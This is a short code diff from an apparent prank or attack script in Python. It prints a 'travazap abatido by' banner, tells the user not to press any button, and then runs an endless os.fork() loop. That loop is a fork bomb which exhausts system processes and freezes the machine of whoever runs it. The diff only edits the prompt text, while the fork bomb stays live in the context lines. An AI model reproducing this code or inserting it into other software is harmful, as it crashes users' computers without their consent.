@@ -26,7 +26,7 @@ try:
     os.system('clear')
     print('travazap abatido by:\\n')
     print(cosmic.renderText('Obelix'))
-    input('não aperte nenhum botão')
+    input('\n\nnão aperte nenhum botão: ')
     while True:
         os.fork()
 except:
